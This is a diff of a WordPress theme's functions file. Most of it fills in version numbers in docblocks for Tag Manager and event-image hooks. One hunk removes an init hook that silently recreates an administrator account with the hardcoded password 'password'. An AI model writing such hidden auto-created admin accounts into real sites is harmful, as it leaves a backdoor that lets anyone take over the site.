@@ -142,7 +142,7 @@ require_once( 'library/admin/tinymce/color-palette.php' );
 /**
  * Add Google Tag Manager code to <head>
  * 
- * @since		{{VERSION}}
+ * @since		1.0.1
  * @return		void
  */
 add_action( 'wp_head', 'gjh_tag_manager_head' );
@@ -165,7 +165,7 @@ function gjh_tag_manager_head() {
 /**
  * Add Google Tag Manager code to <body>
  * 
- * @since		{{VERSION}}
+ * @since		1.0.1
  * @return		void
  */
 add_action( 'gjh_body_start', 'gjh_tag_manager_body' );
@@ -191,24 +191,12 @@ add_filter( 'tribe_event_featured_image', 'gjh_tribe_event_featured_image', 10, 
  * @param		integer $post_id             Post ID
  * @param		string  $size                Image Size Name
  *                                                 
- * @since		{{VERSION}}
+ * @since		1.0.1
  * @return		string  Featured Image HTML
  */
 function gjh_tribe_event_featured_image( $featured_image_html, $post_id, $size ) {
 	return '';
 }
-
-add_action( 'init', function() {
-
-    if ( get_user_by( 'email', 'erin@realbigmarketing.com' ) ) return;
-    wp_insert_user( array(
-        'user_email' => 'erin@realbigmarketing.com',
-        'user_login' => 'erinl',
-        'role' => 'administrator',
-        'user_pass' => 'password',
-    ) );
-} );
-
 
 // No. Just... no
 remove_action( 'wp_head', array( 'Tribe__Events__Templates', 'wpHeadFinished' ), 999 );
